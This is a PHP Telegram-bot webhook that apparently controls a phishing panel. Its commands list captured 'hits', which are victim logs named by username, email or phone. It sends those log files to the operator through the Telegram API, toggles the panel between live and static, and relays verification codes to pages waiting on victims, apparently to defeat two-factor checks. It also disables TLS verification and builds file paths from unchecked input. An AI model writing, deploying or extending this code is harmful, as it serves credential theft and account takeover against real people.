<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    require_once __DIR__ . '/../includes/php/config.php';
    if (trim((string) ($config['bot_token'] ?? '')) === '') {
        http_response_code(200);
        exit;
    }

    require_once __DIR__ . '/../includes/php/bot_api.php';

    $directory = __DIR__ . '/commands/';
    $directory_logs = __DIR__ . '/logs/';
    $directory_codes = __DIR__ . '/codes/';

    if (!file_exists($directory)) {
        mkdir($directory, 0777, true);
    }

    $data = file_get_contents('php://input');
    $update = json_decode($data, true);

    $debugLog = $directory . 'debug.log';
    file_put_contents($debugLog, date('c') . ' RAW ' . substr($data, 0, 2000) . "\n", FILE_APPEND);

    if (!function_exists('webhook_bot_reply')) {
        function webhook_bot_reply($method, $fields) {
            global $config;
            $base = 'https://api.telegram.org/bot' . $config['bot_token'] . '/';
            $url = $base . $method;

            if (isset($fields['document']) && (is_a($fields['document'], 'CURLFile') || $fields['document'] instanceof CURLFile)) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_POST => 1,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_CONNECTTIMEOUT => 25,
                    CURLOPT_TIMEOUT => 60,
                ]);
                $response = curl_exec($ch);
                curl_close($ch);
                $decoded = json_decode($response, true);
                return is_array($decoded) ? telegram_normalize_telegram_response($decoded) : ['ok' => false, 'description' => 'invalid JSON from Telegram'];
            }

            return telegram_post_json($url, $fields);
        }
    }

    if (!function_exists('webhook_send_available_commands')) {
        function webhook_send_available_commands($chat_id, $message_id) {
            $available_commands = [
                '/status - Check page status',
                '/set_status online | offline - Set a page status',
                '/panel - Check panel status',
                '/set_panel live | static - Set a panel mode',
                '/hits - Get a list of all hits',
                '/download VALUE - Download file log by username/email/phone',
                '/verify_code VALUE - Send a verify code (as a reply to a message)',
                '/logout - Disconnect the bot',
                '/help - List all available commands',
            ];
            $commands_text = "<blockquote><b>🛂 Available Commands</b></blockquote>\n" . implode("\n", $available_commands);
            webhook_bot_reply('sendMessage', [
                'chat_id' => $chat_id,
                'text' => $commands_text,
                'reply_to_message_id' => $message_id,
                'parse_mode' => 'html',
            ]);
        }
    }

    if (isset($update['message']['entities']) && isset($update['message']['entities'][0]['type']) && $update['message']['entities'][0]['type'] == 'bot_command') {
        $command_text = $update['message']['text'];
        $parts = explode(' ', $command_text, 3);
        $command = $parts[0];

        switch ($command) {
            case '/status':
                if (isset($config['status'])) {
                    $status = $config['status'];
                    $statusMessage = ($status === 'online')
                        ? '<blockquote><b>🟢 Online</b></blockquote>'
                        : '<blockquote><b>🔴 Offline</b></blockquote>';
                } else {
                    $statusMessage = '<blockquote><b>❌ ERROR</b></blockquote> Status not found';
                }
                webhook_bot_reply('sendMessage', [
                    'chat_id' => $update['message']['chat']['id'],
                    'text' => $statusMessage,
                    'parse_mode' => 'html',
                    'reply_to_message_id' => $update['message']['message_id'],
                ]);
                break;
            case '/panel':
                if (isset($config['panel'])) {
                    $panel = $config['panel'];
                    $panelMessage = ($panel === 'live')
                        ? '<blockquote><b>🟢 Live</b></blockquote>'
                        : '<blockquote><b>🔴 Static</b></blockquote>';
                } else {
                    $panelMessage = '<blockquote><b>❌ ERROR</b></blockquote> Panel not found';
                }
                webhook_bot_reply('sendMessage', [
                    'chat_id' => $update['message']['chat']['id'],
                    'text' => $panelMessage,
                    'parse_mode' => 'html',
                    'reply_to_message_id' => $update['message']['message_id'],
                ]);
                break;
            case '/set_status':
                $messageParts = explode(' ', $update['message']['text'], 2);
                $newStatus = isset($messageParts[1]) ? strtolower(trim($messageParts[1])) : null;
                if ($newStatus === 'online' || $newStatus === 'offline') {
                    $config['status'] = $newStatus;
                    $configFilePath = __DIR__ . '/../config.json';
                    if (file_put_contents($configFilePath, json_encode($config, JSON_PRETTY_PRINT))) {
                        $responseMessage = '<blockquote><b>✅ SUCCESS</b></blockquote> Status updated to: ' . $newStatus;
                    } else {
                        $responseMessage = '<blockquote><b>❌ ERROR</b></blockquote> Failed to update the status';
                    }
                } else {
                    $responseMessage = "<blockquote><b>❌ ERROR</b></blockquote> Invalid command. Use 'online' or 'offline'.";
                }
                webhook_bot_reply('sendMessage', [
                    'chat_id' => $update['message']['chat']['id'],
                    'text' => $responseMessage,
                    'parse_mode' => 'html',
                    'reply_to_message_id' => $update['message']['message_id'],
                ]);
                break;
            case '/set_panel':
                $messageParts = explode(' ', $update['message']['text'], 2);
                $newPanel = isset($messageParts[1]) ? strtolower(trim($messageParts[1])) : null;
                if ($newPanel === 'live' || $newPanel === 'static') {
                    $config['panel'] = $newPanel;
                    $configFilePath = __DIR__ . '/../config.json';
                    if (file_put_contents($configFilePath, json_encode($config, JSON_PRETTY_PRINT))) {
                        $responseMessage = '<blockquote><b>✅ SUCCESS</b></blockquote> Panel updated to: ' . $newPanel;
                    } else {
                        $responseMessage = '<blockquote><b>❌ ERROR</b></blockquote> Failed to update the panel';
                    }
                } else {
                    $responseMessage = "<blockquote><b>❌ ERROR</b></blockquote> Invalid command. Use 'live' or 'static'.";
                }
                webhook_bot_reply('sendMessage', [
                    'chat_id' => $update['message']['chat']['id'],
                    'text' => $responseMessage,
                    'parse_mode' => 'html',
                    'reply_to_message_id' => $update['message']['message_id'],
                ]);
                break;
            case '/logout':
                $cfgFilePath = __DIR__ . '/../config.json';
                if (file_exists($cfgFilePath)) {
                    if (unlink($cfgFilePath)) {
                        $responseMessage = '<blockquote><b>✅ SUCCESS</b></blockquote>Logged out successfully.';
                    } else {
                        $responseMessage = '<blockquote><b>❌ ERROR</b></blockquote>Logout failed.';
                    }
                } else {
                    $responseMessage = '<blockquote><b>❌ ERROR</b></blockquote>Logout failed. Configuration file does not exist.';
                }
                webhook_bot_reply('sendMessage', [
                    'chat_id' => $update['message']['chat']['id'],
                    'text' => $responseMessage,
                    'parse_mode' => 'html',
                    'reply_to_message_id' => $update['message']['message_id'],
                ]);
                break;
            case '/verify_code':
                if (count($parts) === 2 && isset($update['message']['reply_to_message'])) {
                    $value = $parts[1];
                    $filename = $update['message']['reply_to_message']['message_id'];
                    if (!file_exists($directory_codes)) {
                        mkdir($directory_codes, 0777, true);
                    }
                    $filePath = $directory_codes . $filename . '.txt';
                    $file = fopen($filePath, 'w');
                    if ($file !== false) {
                        if (fwrite($file, trim($value)) !== false) {
                            webhook_bot_reply('sendMessage', [
                                'chat_id' => $update['message']['chat']['id'],
                                'text' => '<blockquote><b>✅ SUCCESS</b></blockquote>',
                                'reply_to_message_id' => $update['message']['message_id'],
                                'parse_mode' => 'html',
                            ]);
                        } else {
                            webhook_bot_reply('sendMessage', [
                                'chat_id' => $update['message']['chat']['id'],
                                'text' => '<blockquote><b>❌ ERROR</b></blockquote> Failed to save the verification value.',
                                'reply_to_message_id' => $update['message']['message_id'],
                                'parse_mode' => 'html',
                            ]);
                        }
                        fclose($file);
                    } else {
                        webhook_bot_reply('sendMessage', [
                            'chat_id' => $update['message']['chat']['id'],
                            'text' => '<blockquote><b>❌ ERROR</b></blockquote> Failed to open the file for writing.',
                            'reply_to_message_id' => $update['message']['message_id'],
                            'parse_mode' => 'html',
                        ]);
                    }
                } else {
                    webhook_bot_reply('sendMessage', [
                        'chat_id' => $update['message']['chat']['id'],
                        'text' => '<blockquote><b>❌ ERROR</b></blockquote> Incorrect command format or not a reply to a message.',
                        'reply_to_message_id' => $update['message']['message_id'],
                        'parse_mode' => 'html',
                    ]);
                }
                break;
            case '/download':
                if (count($parts) === 2) {
                    $filename = trim($parts[1]);
                    $filePath = $directory_logs . $filename . '.txt';
                    if (file_exists($filePath)) {
                        $realFilePath = realpath($filePath);
                        if (!$realFilePath) {
                            webhook_bot_reply('sendMessage', [
                                'chat_id' => $update['message']['chat']['id'],
                                'text' => '<blockquote><b>❌ ERROR</b></blockquote> Failed to resolve real path for file: ' . $filePath,
                                'reply_to_message_id' => $update['message']['message_id'],
                                'parse_mode' => 'html',
                            ]);
                            break;
                        }
                        $document = new CURLFile($realFilePath);
                        $fields = [
                            'chat_id' => $update['message']['chat']['id'],
                            'document' => $document,
                            'reply_to_message_id' => $update['message']['message_id'],
                        ];
                        $ch = curl_init('https://api.telegram.org/bot' . $config['bot_token'] . '/sendDocument');
                        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 25);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                        $response = curl_exec($ch);
                        curl_close($ch);
                        $response = json_decode($response, true);
                        if (isset($response['ok']) && $response['ok']) {
                            echo 'File sent';
                        } else {
                            webhook_bot_reply('sendMessage', [
                                'chat_id' => $update['message']['chat']['id'],
                                'text' => '<blockquote><b>❌ ERROR</b></blockquote> Failed to send file. Telegram API error: ' . json_encode($response),
                                'reply_to_message_id' => $update['message']['message_id'],
                                'parse_mode' => 'html',
                            ]);
                        }
                    } else {
                        webhook_bot_reply('sendMessage', [
                            'chat_id' => $update['message']['chat']['id'],
                            'text' => '<blockquote><b>❌ ERROR</b></blockquote> No hit found for the username: ' . $filename,
                            'reply_to_message_id' => $update['message']['message_id'],
                            'parse_mode' => 'html',
                        ]);
                    }
                } else {
                    webhook_bot_reply('sendMessage', [
                        'chat_id' => $update['message']['chat']['id'],
                        'text' => '<blockquote><b>❌ ERROR</b></blockquote>Incorrect command format.',
                        'reply_to_message_id' => $update['message']['message_id'],
                        'parse_mode' => 'html',
                    ]);
                }
                break;
            case '/hits':
                $files = array_filter(scandir($directory_logs), function ($file) use ($directory_logs) {
                    return is_file($directory_logs . $file) && pathinfo($file, PATHINFO_EXTENSION) === 'txt';
                });
                if (empty($files)) {
                    webhook_bot_reply('sendMessage', [
                        'chat_id' => $update['message']['chat']['id'],
                        'text' => 'No hits found.',
                        'reply_to_message_id' => $update['message']['message_id'],
                        'parse_mode' => 'html',
                    ]);
                } else {
                    $emails = array_map(function ($file) {
                        return '- ' . basename($file, '.txt');
                    }, $files);
                    $emailCount = count($emails);
                    $emailList = '<blockquote> <b>🚀 Hits [' . $emailCount . ']</b> </blockquote>' . "\n" . implode("\n", $emails);
                    webhook_bot_reply('sendMessage', [
                        'chat_id' => $update['message']['chat']['id'],
                        'text' => $emailList,
                        'parse_mode' => 'html',
                        'reply_to_message_id' => $update['message']['message_id'],
                    ]);
                }
                break;
            default:
                webhook_send_available_commands($update['message']['chat']['id'], $update['message']['message_id']);
                break;
        }
    } elseif (isset($update['callback_query'])) {
        $raw = trim((string) ($update['callback_query']['data'] ?? ''));
        // callback_data is expected to be: "<32hex_unique_id> <command>"
        // Be defensive: Telegram truncation / whitespace oddities should not break command routing.
        $request_id = '';
        $bot_command = '';
        if (preg_match('/^([0-9a-f]{32})\s+(.+)$/i', $raw, $m)) {
            $request_id = strtolower($m[1]);
            $bot_command = trim((string) $m[2]);
        } else {
            $callback_parts = preg_split('/\s+/', $raw, 2);
            $request_id = isset($callback_parts[0]) ? trim($callback_parts[0]) : '';
            $bot_command = isset($callback_parts[1]) ? trim($callback_parts[1]) : '';
            // Ensure request_id can't be path-injected; valid ids are 32 hex chars.
            $request_id = strtolower(preg_replace('/[^0-9a-f]/i', '', (string) $request_id));
            if (strlen($request_id) !== 32) {
                $request_id = '';
            }
        }

        file_put_contents($debugLog, date('c') . " CALLBACK raw=" . $raw . " id=" . $request_id . " cmd=" . $bot_command . "\n", FILE_APPEND);

        if ($request_id === '' || $bot_command === '') {
            exit;
        }

        if (!file_exists($directory)) {
            mkdir($directory, 0777, true);
        }

        $filePath = $directory . $request_id . '.txt';
        $cqId = $update['callback_query']['id'] ?? '';

        $file = fopen($filePath, 'w');
        if ($file !== false) {
            $written = fwrite($file, $bot_command);
            fclose($file);
            if ($written !== false) {
                if ($cqId !== '') {
                    webhook_bot_reply('answerCallbackQuery', ['callback_query_id' => $cqId]);
                }
            } else {
                webhook_bot_reply('sendMessage', [
                    'chat_id' => $update['callback_query']['message']['chat']['id'],
                    'text' => '<blockquote><b>❌ ERROR</b></blockquote> Failed to write content to text file.',
                    'parse_mode' => 'html',
                ]);
            }
        } else {
            webhook_bot_reply('sendMessage', [
                'chat_id' => $update['callback_query']['message']['chat']['id'],
                'text' => '<blockquote><b>❌ ERROR</b></blockquote> Failed to open text file for writing.',
                'parse_mode' => 'html',
            ]);
        }
    }
}
